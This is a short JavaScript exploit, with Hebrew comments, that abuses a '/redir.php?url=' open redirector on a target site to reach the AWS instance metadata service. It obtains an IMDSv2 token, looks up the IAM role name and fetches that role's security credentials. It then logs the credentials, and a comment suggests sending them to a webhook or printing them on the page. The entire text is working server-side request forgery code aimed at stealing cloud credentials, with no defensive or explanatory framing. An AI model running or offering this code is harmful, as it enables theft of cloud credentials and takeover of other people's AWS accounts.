const imdsTokenUrl = 'http://169.254.169.254/latest/api/token';
const redirectorUrl = '/redir.php?url=' + encodeURIComponent(imdsTokenUrl);

fetch(redirectorUrl, {
  method: 'PUT',
  headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
})
.then(res => res.text())
.then(token => {
  // המשך בקשות עם הטוקן
  const iamUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  const iamRedirect = '/redir.php?url=' + encodeURIComponent(iamUrl);

  return fetch(iamRedirect, {
    headers: { 'X-aws-ec2-metadata-token': token }
  })
  .then(res => res.text())
  .then(role => {
    const credsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role;
    const credsRedirect = '/redir.php?url=' + encodeURIComponent(credsUrl);

    return fetch(credsRedirect, {
      headers: { 'X-aws-ec2-metadata-token': token }
    });
  });
})
.then(res => res.text())
.then(creds => {
  console.log('Got credentials:', creds);
  // שלחי ל-webhook או הדפיסי בדף
})
.catch(err => {
  console.error('Error:', err);
});
